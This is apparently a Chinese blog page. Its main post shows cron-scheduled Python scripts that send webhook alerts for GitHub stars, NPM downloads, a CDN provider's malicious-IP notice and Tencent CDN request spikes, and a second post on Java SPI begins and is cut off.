                    <span>https://cdn.gallery.uuanqin.top/img/githubstarcover.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b9dad4e7</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍一些简单定时脚本的编写并利用 Webhook 推送</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!notice] 文章重要更新 <code>240724</code><br>
由于近期惨遭某些省的 IP 多轮恶意刷量，现新增两个小脚本加强网站被攻击状况的感知。<br>
原文写于 <code>231206</code>。</p>
</blockquote>
<p>这篇文章通过一些简单的 Python 脚本演示定时脚本配合 Webhook 的使用。</p>
<p>通过这个思路，你可以展开更多的想法：</p>
<ul>
<li>实时监测 GitHub 的各项信息并推送</li>
<li>NPM 包下载量监测</li>
<li>LeetCode 每日一题</li>
<li>排名监测</li>
<li>获取某官网上的重要公告</li>
<li>监控云服务平台的各项数据</li>
<li>......</li>
</ul>
<p>本文主要介绍：</p>
<ol>
<li>获取用户 Github 上的 Star 数量并推送的脚本编写</li>
<li>根据用户名监测某作者 NPM 包年下载量</li>
<li><strong>实时监测多吉云团队公布的文章「近期部分加速域名晚间遭遇恶意流量事件说明」通告是否更新</strong></li>
<li><strong>监控腾讯云 CDN 请求数是否超限</strong></li>
</ol>
<h1>获取 Github 上的 Star 数量并推送</h1>
<h2>GitHub 应用注册</h2>
<p>打开你的 GitHub 主页（profile）进入开发者选项：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206211025.webp" alt="image.png"></p>
<p>选择「新建一个」GitHub APP。根据需要进行相关设置的填写。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206211112.webp" alt="image.png|500"></p>
<p>生成密钥：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206211249.webp" alt="image.png|500"></p>
<p>记住密钥，待会脚本需要调用。</p>
<h2>脚本的编写</h2>
<p>这里参考了 <a href="https://github.com/songquanpeng/scripts">songquanpeng/scripts</a> 的实现，并进行修复与改编。</p>
<p>这个 python 脚本（这里命名为 <code>github_stars.py</code>）所做的工作：</p>
<ol>
<li>调用 GitHub API（<a href="https://docs.github.com/en/rest/repos?apiVersion=2022-11-28">Repositories - GitHub Docs</a>）</li>
<li>统计所有项目的 star 数量</li>
<li>与上次统计结果进行比较（结果保存在本地）</li>
<li>调用推送服务发送 POST JSON 格式的请求</li>
</ol>
<p>执行脚本需要的三个参数：</p>
<ul>
<li>GitHub 用户名</li>
<li>GitHub API 令牌</li>
<li>调用的推送服务（将发送 POST）请求</li>
</ul>
<p>源代码【非面向对象版本】如下：</p>
<pre><code class="language-python"># -*- coding: utf-8 -*-

#!/usr/bin/python3
import json
import requests
import sys

# 存储上次检测的 star 数的文件
filename = &quot;./.star_count&quot;
# Push链接
push_url = &quot;&quot;
# 用户名
username=&quot;&quot;

def star_counter(username: str, token: &quot;&quot;) -&gt; int:
    &quot;&quot;&quot;
    调用GitHub API获取个人仓库信息，返回统计的stars数
    :param username:
    :param token:
    :return:
    &quot;&quot;&quot;
    # 链接的构建
    all_repos_url = f&quot;https://api.github.com/users/{username}/repos?per_page=100&quot;
    header = {} if token == &quot;&quot; else {&quot;Authorization&quot;: f&quot;bearer {token}&quot;}
    # 向GitHub发送请求
    res = requests.get(all_repos_url, header)
    repos = res.json()
    # 解析响应并统计
    count = 0
    for repo in repos:
        count += repo[&quot;stargazers_count&quot;]
    return count


def load_count() -&gt; int:
    '''
    加载上一次的统计结果，若无则默认为0
    :return:
    '''
    try:
        with open(filename, 'r') as f:
            count = int(f.read())
    except IOError:
        count = 0
    return count


def save_count(count: int):
    '''
    保存统计结果
    :param count:
    :return:
    '''
    with open(filename, 'w') as f:
        f.write(str(count))


def send_message(msg: str):
    &quot;&quot;&quot;
    发送消息
    :param msg:
    :return:
    &quot;&quot;&quot;
    headers = {
        &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;
    }
    pyload = {
        &quot;title&quot;:&quot;GitHub Stars&quot;,
        &quot;msg&quot;:msg
    }
    response = requests.post(push_url,data=json.dumps(pyload),headers=headers).text
    print(response)

def message_construct(last_count,current_count) -&gt; str:
    &quot;&quot;&quot;
    自定义的信息构造函数。
    样例：【每日检测】检测到用户uuanqin总star数增加 :) 。[0 -&gt; 6, total: 6]
    :param last_count:
    :param current_count:
    :return:
    &quot;&quot;&quot;
    s = f&quot;【每日检测】检测到用户{username}总star数&quot;
    if current_count &gt; last_count:
        s += f&quot;增加 :) 。&quot;
    else:
        s += f&quot;降低 :( 。&quot;
    s += f&quot;[{last_count} -&gt; {current_count}, total: {current_count-last_count}]&quot;
    return s

def main():
    # 参数检查
    if len(sys.argv) != 4:
        print(&quot;Error! This script requires three arguments: GITHUB_USERNAME GITHUB_TOKEN PUSH_URL&quot;)
        return
    # 参数设置
    global push_url,username
    username = sys.argv[1]
    token = sys.argv[2]
    push_url = sys.argv[3]

    # 获取上一次统计结果
    last_count = load_count()
    # 获取本次统计结果
    current_count = star_counter(username, token)

    # 根据数量变化进行判断
    if current_count != last_count:
        send_message(message_construct(last_count,current_count))
        # 只有数量发生变化才保存结果
        save_count(current_count)

if __name__ == '__main__':
    main()
</code></pre>
<p>注意，代码中不要使用奇奇怪怪的字符，比如 emoji 表情等，导致 utf-8 和 gbk 都不能识别。</p>
<p>这里我使用了自己的部署服务。使用示例：</p>
<pre><code class="language-sh">python ./github_stars.py uuanqin 9xxxxxxxx7 https://push.uuanqin.top/webhook/8xxxxxxe
</code></pre>
<p>把脚本放在 Linux 服务器上，记得测试。</p>
<blockquote>
<p>这里使用的 API 似乎有点老了，但是还能用。我在文档中没有找到<strong>确切</strong>的对应文档说明。</p>
</blockquote>
<h2>定时执行</h2>
<p>新建 cron 文件：</p>
<pre><code class="language-cron">2 8 * * * /usr/bin/python /var/www/push_script/github_stars/github_stars.py uuanqin 9xxxxxxxxxxxxxx7 https://push.uuanqin.top/webhook/8xxxxxxxxxxxxxxe
</code></pre>
<p>添加定时任务：</p>
<pre><code class="language-sh">crontab github_stars.cron
</code></pre>
<p>每天早上 8 点 02 分调用该脚本。</p>
<p>附 <a href="https://tool.lu/crontab/">在线网站</a> 验证结果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206214712.webp" alt="image.png|237"></p>
<blockquote>
<p>不了解 cron 可以查看这篇文章：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link ">Linux 使用 Cron 创建定时任务</a></p>
</blockquote>
<p>像我的部署服务使用了飞书群机器人，推送效果如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231206214530.webp" alt="image.png"></p>
<h1>NPM 下载量的监测</h1>
<p>根据上一小节介绍的脚本，我们重构一下，改成面向对象的版本。以下脚本能同时支持 GitHub stars 数量的检测以及 NPM 年下载量的检测。注意，临时的数据文件存储在 root 的目录下。</p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
import datetime
#!/usr/bin/python3
import json
import os

import requests
import sys
from abc import ABC, abstractmethod

from dateutil.relativedelta import relativedelta


class Obj:
    # 存储统计数的文件名
    filename = &quot;&quot;
    title = &quot;&quot;
    last_count = 0
    current_count = 0
    # Push链接
    push_url = &quot;&quot;

    def __init__(self,push_url):
        self.push_url = push_url
        self.load_count()
        self.count()


    @abstractmethod
    def count(self):
        pass

    @abstractmethod
    def message_construct(self):
        pass


    def load_count(self):
        '''
        加载上一次的统计结果，若无则默认为0
        '''
        try:
            with open(self.filename, 'r') as f:
                count = int(f.read())
        except IOError:
            count = 0
        self.last_count = count


    def save_count(self):
        '''
        保存统计结果
        '''
        with open(self.filename, 'w') as f:
            f.write(str(self.current_count))

    def send_message(self, msg: str):
        &quot;&quot;&quot;
        发送消息
        &quot;&quot;&quot;
        headers = {
            &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;
        }
        pyload = {
            &quot;title&quot;: self.title,
            &quot;msg&quot;: msg
        }
        response = requests.post(self.push_url, data=json.dumps(pyload), headers=headers).text
        print(response)

    def push(self):
        # 根据数量变化进行判断
        current_count = self.current_count
        last_count = self.last_count
        if current_count != last_count:
            self.send_message(self.message_construct())
            # 只有数量发生变化才保存结果
            self.save_count()


class GitHubStars(Obj):

    # 用户名
    username = &quot;&quot;
    github_token = &quot;&quot;
    def __init__(self,push_url,token,username):

        self.filename = os.path.join(os.getcwd(),&quot;.star_count&quot;)
        self.title = &quot;GitHub Stars Count&quot;
        self.github_token = token
        self.username = username
        super().__init__(push_url)

    def count(self):
        &quot;&quot;&quot;
        调用GitHub API获取个人仓库信息，返回统计的stars数
        &quot;&quot;&quot;
        # 链接的构建
        all_repos_url = f&quot;https://api.github.com/users/{self.username}/repos?per_page=100&quot;
        header = {} if self.github_token == &quot;&quot; else {&quot;Authorization&quot;: f&quot;bearer {self.github_token}&quot;}
        # 向GitHub发送请求
        res = requests.get(all_repos_url, header)
        repos = res.json()
        # 解析响应并统计
        count = 0
        for repo in repos:
            count += repo[&quot;stargazers_count&quot;]
        self.current_count =  count

    def message_construct(self) -&gt; str:
        &quot;&quot;&quot;
        自定义的信息构造函数。
        样例：【每日检测】检测到用户uuanqin总star数增加 :) 。[0 -&gt; 6, total: 6]
        &quot;&quot;&quot;
        s = f&quot;【每日检测】检测到用户{self.username}总star数&quot;
        if self.current_count &gt; self.last_count:
            s += f&quot;增加 :) 。&quot;
        else:
            s += f&quot;降低 :( 。&quot;
        s += f&quot;[{self.last_count} -&gt; {self.current_count}, total: {self.current_count-self.last_count}]&quot;
        return s

class NpmAuthorDownloads(Obj):
    username = &quot;&quot;
    def __init__(self,push_url,username):
        self.filename = os.path.join(os.getcwd(),&quot;.npm_count&quot;)
        self.title = &quot;GitHub Stars Count&quot;
        self.username = username
        super().__init__(push_url)

    def count(self):
        nowtime = datetime.datetime.now()
        yesterdate = nowtime - datetime.timedelta(days=+1)
        last_year = yesterdate - relativedelta(years=1)
        yesterdate_strf=yesterdate.strftime('%Y-%m-%d')
        last_year_strf=last_year.strftime('%Y-%m-%d')
        url = f&quot;https://npm-stat.com/api/download-counts?author={self.username}&amp;from={last_year_strf}&amp;until={yesterdate_strf}&quot;
        # 向GitHub发送请求
        res = requests.get(url)
        repos = res.json()
        # 解析响应并统计
        count = 0
        for p,con in repos.items():
            for d,v in con.items():
                count += v
        self.current_count = count


    def message_construct(self):
        &quot;&quot;&quot;
        自定义的信息构造函数。
        样例：【每日检测】检测到用户uuanqin总star数增加 :) 。[0 -&gt; 6, total: 6]
        &quot;&quot;&quot;
        s = f&quot;【每日检测】检测到用户{self.username}的NPM账户去年包下载量发生变动。&quot;
        s += f&quot;[{self.last_count} -&gt; {self.current_count}, total: {self.current_count - self.last_count}]&quot;
        return s


def main():
    # 参数检查
    if len(sys.argv) &lt;2:
        print(&quot;Error! Arguments is illegal&quot;)
        return

    type = sys.argv[1]
    obj = None

    if type==&quot;github_stars&quot; and len(sys.argv) != 5:
        print(&quot;Error! This script requires Four arguments: TYPE GITHUB_USERNAME GITHUB_TOKEN PUSH_URL&quot;)
        return
    elif type==&quot;npm_downloads&quot; and len(sys.argv) != 4:
        print(&quot;Error! This script requires Four arguments: TYPE NPM_AUTHOR PUSH_URL&quot;)
        return
    elif type!= &quot;github_stars&quot; and type!= &quot;npm_downloads&quot;:
        print(&quot;Error! Arguments is illegal&quot;)
        return


    if type == &quot;github_stars&quot;:
        obj = GitHubStars(sys.argv[4],sys.argv[3],sys.argv[2])
    elif type == &quot;npm_downloads&quot;:
        obj = NpmAuthorDownloads(sys.argv[3],sys.argv[2])

    obj.push()


if __name__ == '__main__':
    main()
</code></pre>
<p>示例 cron：</p>
<pre><code class="language-cron">2 8 * * * /usr/bin/python /var/www/push_script/count_detect/count_detect.py github_stars uuanqin 94xxxxc2b7 https://push.uuanqin.top/webhook/3f2xxxxbd
3 8 * * * /usr/bin/python /var/www/push_script/count_detect/count_detect.py npm_downloads wuanqin https://push.uuanqin.top/webhook/3f2xxxxbd
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240724230653.webp" alt="image.png"></p>
<h1>检测重要网页的更新</h1>
<blockquote>
<p>背景：2024 年 7 月开始，中小型博客网站遭遇恶意流量攻击。多吉云团队公布的高危 IP 为中小博客站长提供了有用的防范信息。我们需要定时检测这个重要信息的更新及时将危险 IP 列入黑名单中。</p>
</blockquote>
<p>信息通知地址：<a href="https://www.dogecloud.com/announcement/26">公告 - 多吉云 (dogecloud.com)</a></p>
<p>通过 F12 调试工具得知接口 API 请求地址为： <a href="https://api.dogecloud.com/home/announcement/detail.json?id=26">https://api.dogecloud.com/home/announcement/detail.json?id=26</a></p>
<p>编写简单脚本检测文章内容是否改变。如果改变则推送通知。</p>
<p>脚本内容为上一小节中脚本的简化：</p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
import datetime
# !/usr/bin/python3
import json
import os

import requests
import sys


class Notice:
    filename = &quot;&quot;
    title = &quot;&quot;

    # Push链接
    push_url = &quot;&quot;

    # 上次页面内容
    last_content = &quot;&quot;
    # 本次加载内容
    now_content = &quot;&quot;

    def __init__(self, push_url):
        self.push_url = push_url
        self.filename = os.path.join(os.getcwd(), &quot;.cdn_notice&quot;)
        self.title = &quot;CDN Notice was Updated&quot;
        self.load_page()
        self.get()

    def load_page(self):
        '''
        加载上一次的页面报告，若无则默认为空
        '''
        try:
            with open(self.filename, 'r') as f:
                last_content = f.read()
        except IOError:
            last_content = &quot;&quot;
        self.last_content = last_content

    def save_page(self):
        '''
        保存页面 只有页面发生变化才保存结果
        '''
        with open(self.filename, 'w') as f:
            f.write(self.now_content)

    def send_message(self, msg: str):
        &quot;&quot;&quot;
        发送消息
        &quot;&quot;&quot;
        headers = {
            &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;
        }
        pyload = {
            &quot;title&quot;: self.title,
            &quot;msg&quot;: msg
        }
        response = requests.post(self.push_url, data=json.dumps(pyload), headers=headers).text
        print(response)

    def push(self):
        # 根据页面变化进行判断
        if self.now_content != self.last_content:
            self.send_message(self.message_construct())
            # 只有页面发生变化才保存结果
            self.save_page()

    def get(self):
        &quot;&quot;&quot;
        获取页面数据
        &quot;&quot;&quot;

        # header = {} if self.github_token == &quot;&quot; else {&quot;Authorization&quot;: f&quot;bearer {self.github_token}&quot;}

        res = requests.get(&quot;https://api.dogecloud.com/home/announcement/detail.json?id=26&quot;)
        res_json = res.json()
        self.now_content = res_json[&quot;data&quot;][&quot;content&quot;]

    def message_construct(self) -&gt; str:
        &quot;&quot;&quot;
        自定义的信息构造函数。
        &quot;&quot;&quot;
        s = f&quot;【每日检测】检测到多吉云CDN恶意IP公示更新。请及时查看： https://www.dogecloud.com/announcement/26&quot;
        return s


def main():
    # 参数检查
    if len(sys.argv) &lt; 2:
        print(&quot;Error! Arguments is illegal&quot;)
        return

    push_url = sys.argv[1]
    obj = Notice(push_url)

    obj.push()


if __name__ == '__main__':
    main()

</code></pre>
<p>示例 cron：</p>
<pre><code class="language-cron">9 8 * * * /usr/bin/python /var/www/push_script/cdn_notice/cdn_notice.py https://push.uuanqin.top/webhook/3f2xxxxbd
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240724230600.webp" alt="image.png"></p>
<h1>监控腾讯云 CDN 命中请求数</h1>
<blockquote>
<p>腾讯云预警时效还是有点长，敏感度不够，我们可以利用 API 自写脚本进行预警。CDN 流量与带宽监控需要开通 ecdn，所以这里就监控命中的请求数或响应码。</p>
</blockquote>
<p>需求：每半小时对 CDN 响应状态码进行分析，半小时内命中的响应状态码数量异常时将推送通知。</p>
<p>安装 SDK：</p>
<pre><code class="language-sh">pip install tencentcloud-sdk-python-cdn
</code></pre>
<p>通过腾讯云 API Explorer 快速得到 SDK 代码写法：<a href="https://console.cloud.tencent.com/api/explorer?Product=cdn&amp;Version=2018-06-06&amp;Action=DescribeCdnData">API Explorer - 云 API - 控制台 (tencent.com)</a></p>
<blockquote>
<p>任何时候使用任何 API 时都要注意保护好密钥。详见：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></p>
</blockquote>
<pre><code class="language-python"># -*- coding: utf-8 -*-

#!/usr/bin/python3

import json
import os
import datetime
import sys
import types

import requests
from tencentcloud.common import credential
from tencentcloud.common.profile.client_profile import ClientProfile
from tencentcloud.common.profile.http_profile import HttpProfile
from tencentcloud.common.exception.tencent_cloud_sdk_exception import TencentCloudSDKException
from tencentcloud.cdn.v20180606 import cdn_client, models

IMPORTANT_PUSH_URL = &quot;&quot;
NORMAL_PUSH_URL = &quot;&quot;
now_datetime = datetime.datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)
last_datetime = (datetime.datetime.now()+datetime.timedelta(minutes=-30)).strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)

MESSAGE_TITLE = &quot;CDN请求监控&quot;
def detect():
    try:
        # 实例化一个认证对象，入参需要传入腾讯云账户 SecretId 和 SecretKey，此处还需注意密钥对的保密
        # 代码泄露可能会导致 SecretId 和 SecretKey 泄露，并威胁账号下所有资源的安全性。以下代码示例仅供参考，建议采用更安全的方式来使用密钥，请参见：https://cloud.tencent.com/document/product/1278/85305
        # 密钥可前往官网控制台 https://console.cloud.tencent.com/cam/capi 进行获取
        cred = credential.Credential(os.environ.get(&quot;TENCENT_API_SECRETID&quot;), os.environ.get(&quot;TENCENT_API_SECRETKEY&quot;))
        # 实例化一个http选项，可选的，没有特殊需求可以跳过
        httpProfile = HttpProfile()
        httpProfile.endpoint = &quot;cdn.tencentcloudapi.com&quot;

        # 实例化一个client选项，可选的，没有特殊需求可以跳过
        clientProfile = ClientProfile()
        clientProfile.httpProfile = httpProfile
        # 实例化要请求产品的client对象,clientProfile是可选的
        client = cdn_client.CdnClient(cred, &quot;&quot;, clientProfile)

        # 实例化一个请求对象,每个接口都会对应一个request对象
        req = models.DescribeCdnDataRequest()
        params = {
            &quot;StartTime&quot;:  last_datetime,
            &quot;EndTime&quot;: now_datetime,
            &quot;Metric&quot;: &quot;statusCode&quot;,
            &quot;Interval&quot;: &quot;5min&quot;
        }
        req.from_json_string(json.dumps(params))

        # 返回的resp是一个DescribeCdnDataResponse的实例，与请求对象对应
        resp = client.DescribeCdnData(req)
        # 输出json格式的字符串回包
        res_dict = json.loads(resp.to_json_string())
        print(res_dict)
        data_analyse(res_dict)

    except TencentCloudSDKException as err:
        print(err)

# 限制值
HALF_HOUR_LIMIT_HITS = 500
# FIVE_MINUTES_LIMIT_HITS = 200

def data_analyse(info_dict:dict):
    &quot;&quot;&quot;
    数据分析。
    :param info_dict:
    :return:
    &quot;&quot;&quot;
    global HALF_HOUR_LIMIT_HITS


    total_dict = dict()
    cdn_datas = info_dict.get(&quot;Data&quot;)[0].get(&quot;CdnData&quot;)
    for data in cdn_datas:
        metric = data.get(&quot;Metric&quot;)
        total = data.get(&quot;SummarizedData&quot;).get(&quot;Value&quot;)
        total_dict[metric]=total


    total_2xx = total_dict.get(&quot;2xx&quot;)
    total_3xx = total_dict.get(&quot;3xx&quot;)
    total_4xx = total_dict.get(&quot;4xx&quot;)
    total_5xx = total_dict.get(&quot;5xx&quot;)

    s = &quot;【CDN状态码检测】 &quot; + last_datetime + &quot; 至 &quot; + now_datetime

    if total_2xx&gt;= HALF_HOUR_LIMIT_HITS:
        send_message(IMPORTANT_PUSH_URL,MESSAGE_TITLE,f&quot;{s}2xx 响应次数过多，CDN可能正在遭受盗刷！count={total_2xx}&quot;)

    if total_3xx&gt;= HALF_HOUR_LIMIT_HITS:
        send_message(NORMAL_PUSH_URL,MESSAGE_TITLE,f&quot;{s}3xx 响应次数异常。count={total_3xx}&quot;)

    if total_4xx&gt;= HALF_HOUR_LIMIT_HITS:
        send_message(NORMAL_PUSH_URL,MESSAGE_TITLE,f&quot;{s}4xx 响应次数异常。count={total_4xx}&quot;)

    if total_5xx&gt;= HALF_HOUR_LIMIT_HITS:
        send_message(NORMAL_PUSH_URL,MESSAGE_TITLE,f&quot;{s} 5xx 响应次数异常。count={total_5xx}&quot;)


def send_message(push_url:str,title:str, msg: str):
    &quot;&quot;&quot;
    发送消息
    &quot;&quot;&quot;
    headers = {
        &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;
    }
    pyload = {
        &quot;title&quot;: title,
        &quot;msg&quot;: msg
    }
    response = requests.post(push_url, data=json.dumps(pyload), headers=headers).text
    print(response)

def main():
    global IMPORTANT_PUSH_URL,NORMAL_PUSH_URL
    # 参数检查
    if len(sys.argv) &lt; 3:
        print(&quot;Error! Arguments is illegal&quot;)
        return

    IMPORTANT_PUSH_URL = sys.argv[1]
    NORMAL_PUSH_URL = sys.argv[2]


    detect()

if __name__ == '__main__':
    main()

</code></pre>
<p>示例 cron 写法：</p>
<pre><code class="language-cron">*/30 * * * * /usr/bin/python /var/www/push_script/cdn_request_detect/hit-request-notice.py https://push.uuanqin.top/webhook/92xxxxx70be7 https://push.uuanqin.top/webhook/3fxxxx24bd
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240724230616.webp" alt="image.png"></p>
<h1>cron 的其它应用</h1>
<ul>
<li><a href="#888931094" title="go-cqhttp 部署与简单编程" class="record-link ">go-cqhttp 部署与简单编程</a></li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://stackoverflow.com/questions/8713596/how-to-retrieve-the-list-of-all-github-repositories-of-a-person">How to retrieve the list of all GitHub repositories of a person? - Stack Overflow</a></li>
<li><a href="https://blog.csdn.net/jiongxian1/article/details/115914973">linux cron_/var/spool/cron/ccsp&quot;:1: premature eof_追逐吾之所求的博客-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/Baozijiaruqing/article/details/103900387">Python~OS模块--将文件保存到指定路径_python用os创建文件夹保存在哪-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/monogem/p/11170011.html">python datetime库使用和时间加减计算 - Monogem - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/hyj_king/article/details/123396754">【python】将json字符串转化为json对象_python json字符串转json对象-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="888931094">
                            <a href="#888931094">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>go-cqhttp 部署与简单编程</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#888931094" title="go-cqhttp 部署与简单编程" class="record-link highlight">go-cqhttp 部署与简单编程</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2287168649">
                            <a href="#2287168649">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Linux 使用 Cron 创建定时任务</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>不了解 cron 可以查看这篇文章：<a href="#2287168649" title="Linux 使用 Cron 创建定时任务" class="record-link highlight">Linux 使用 Cron 创建定时任务</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2958737902">
                            <a href="#2958737902">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>任何时候使用任何 API 时都要注意保护好密钥。详见：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="2896927132" class="record">
            <header>
                <h1 class="record-title">SPI 概念及案例实践（上）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                    <button class="btn" onclick="activeTag('SPI');">SPI</button>
                    
                    <button class="btn" onclick="activeTag('API');">API</button>
                    
                    <button class="btn" onclick="activeTag('ServiceLoader');">ServiceLoader</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/31/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240731214853.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过动手实践理解 SPI 并尝试编写 ServiceLoader</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>acab999c</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>SPI 概念</h1>
<p>面向对象设计鼓励模块间基于接口而非具体实现编程，以降低模块间的耦合，遵循依赖倒置原则，并支持开闭原则（对扩展开放，对修改封闭）。</p>
<p>SPI（Service Provider Interface）服务提供了一种服务发现机制，允许在程序外部动态指定具体实现。这与控制反转（IoC）的思想相似，将组件装配的控制权移交给了程序之外。SPI 主要用于实现模块化开发和插件化扩展。</p>
<p>SPI 将服务接口和具体的服务实现分离开来，将服务调用方和服务实现者<strong>解耦</strong>，能够提升程序的扩展性、可维护性。修改或者替换服务实现并不需要修改调用方。</p>
<p>设计思想：</p>
<ul>
<li>面向接口</li>
<li>配置文件</li>
<li>反射技术</li>
<li>策略模式</li>
</ul>
<p>本文源代码详见文末。</p>
<h2>SPI 和 API 的区别</h2>
<p>广义上来说它们都是接口。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240726225753.webp" alt="image.png"></p>
<p>一般模块之间都是通过接口进行通讯，因此我们在服务调用方和服务实现方（也称服务提供者）之间引入一个“接口”。</p>
<ul>
<li>当实现方提供了接口和实现，我们可以通过调用实现方的接口从而拥有实现方给我们提供的能力，这就是 <strong>API</strong>。这种情况下，接口和实现都是放在实现方的包中。调用方通过接口调用实现方的功能，而不需要关心具体的实现细节。</li>
<li>当接口存在于调用方这边时，这就是 <strong>SPI</strong>  。由接口调用方确定接口规则，然后由不同的厂商根据这个规则对这个接口进行实现，从而提供服务。</li>
</ul>
<blockquote>
<p>[!example] 例子感受 SPI<br>
我们使用的主流 Java 开发框架中，几乎都使用到了 SPI 机制，比如 Servlet 容器、日志框架、ORM 框架、Spring 框架、Dubbo 的扩展实现。</p>
<p>例子 1：公司 H 是一家科技公司，新设计了一款芯片，然后现在需要量产了，而市面上有好几家芯片制造业公司，这个时候，只要 H 公司指定好了这芯片生产的标准（定义好了接口标准），那么这些合作的芯片公司（服务提供者）就按照标准交付自家特色的芯片（提供不同方案的实现，但是给出来的结果是一样的）。</p>
<p>例子 2：SLF4J （Simple Logging Facade for Java）是 Java 的一个日志门面（接口），其具体实现有几种，比如：Logback、Log4j、Log4j2 等等，而且还可以切换，在切换日志具体实现的时候我们是不需要更改项目代码的，只需要在 Maven 依赖里面修改一些 pom 依赖就好了。<br>
<img src="https://cdn.gallery.uuanqin.top/img/20240726230144.webp" alt="image.png"></p>
<p>例子 3：一个典型的 SPI 应用场景是 JDBC（Java 数据库连接库），不同的数据库驱动程序开发者可以使用 JDBC 库，然后定制自己的数据库驱动程序。<img src="https://cdn.gallery.uuanqin.top/img/20240727180936.webp" alt="image.png"></p>
</blockquote>
<h1>Java SPI 机制</h1>
<p>一个标准的 SPI，由 3 个组件构成，分别是：</p>
<ul>
<li>1️⃣Service：一个公开的接口或抽象类，定义了一个抽象的功能模块。</li>
<li>2️⃣Service Provider：是 Service 接口的实现类</li>
<li>3️⃣ServiceLoader：SPI 机制中的核心组件（对应 JDK 中的 ServiceLoader 类），负责在运行时发现并加载 Service Provider</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240727180703.webp" alt="image.png"></p>
<p>Java SPI 的规范要素：</p>
<ol>
<li>规范的配置文件：
<ul>
<li>文件路径：必须在 JAR 包中的 META-INF/services 目录下</li>
<li>文件名称：Service 接口的全限定名</li>
<li>文件内容：Service 实现类（即 Service Provider 类）的全限定名。如果有多个实现类，那么每一个实现类在文件中单独占据一行</li>
</ul>
</li>
<li>Service 接口的实现类 Service Provider 类，必须具备无参的默认构造方法。因为随后通过反射技术实例化它时是不带参数的。</li>
<li>保证能加载到配置文件和 Service Provider 类。
<ul>
<li>方式一：将 Service Provider 的 JAR 包放到 classpath 中（最常用）</li>
<li>方式二：将 JAR 包安装到 JRE 的扩展目录中</li>
<li>方式三：自定义一个 ClassLoader</li>
</ul>
</li>
</ol>
<h1>手写 SPI 应用实例</h1>
<h2>使用 Java 的 ServiceLoader</h2>
<p>应用实例的背景介绍：有一家公司 A，它需要连接互联网。它定义了一个连接网络的 API，由中国移动和中国联通来提供网络服务。</p>
<p>这个场景涉及到了以下角色：</p>
<ol>
<li>消费者：公司 A。提供使用以下模块：
<ul>
<li><code>simple-company</code></li>
<li><code>simple-api</code></li>
</ul>
</li>
<li>服务提供者：中国移动、中国联通
<ul>
<li><code>simple-isp-mobile</code>（中国移动提供的 jar 包）</li>
<li><code>simple-isp-unicom</code>（中国联通提供的 jar 包）</li>
</ul>
</li>
